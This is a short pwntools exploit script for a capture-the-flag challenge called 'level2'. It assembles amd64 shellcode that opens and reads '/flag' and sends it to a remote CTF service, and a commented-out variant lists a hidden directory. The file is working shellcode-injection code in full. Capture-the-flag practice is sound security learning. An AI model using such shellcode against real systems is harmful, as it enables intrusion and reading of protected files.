from pwn import *

context.arch = 'amd64'
binary = context.binary = ELF('./level2')
# gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM
# payload = shellcraft.open('/gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM', oflag=constants.O_DIRECTORY)
# payload += shellcraft.getdents('rax', 'rsp', 1048)
# payload += shellcraft.write(1, 'rsp', 'rax')
# payload += shellcraft.exit(0)

payload = shellcraft.pushstr('/flag\x00')
payload += shellcraft.open('rsp', 0, 0)
payload += shellcraft.lstat('rax', 'rsp')
payload += shellcraft.write(1, 'rsp', 0x70)
payload += shellcraft.exit(0)

print(payload)
payload = asm(payload)

p = remote('nc.ctf.unitedctf.ca', 6003)
print(payload)
print(p.recvuntil(b'> '))
info('sending payload')
p.sendline(payload)

print(p.recvall())
p.interactive()
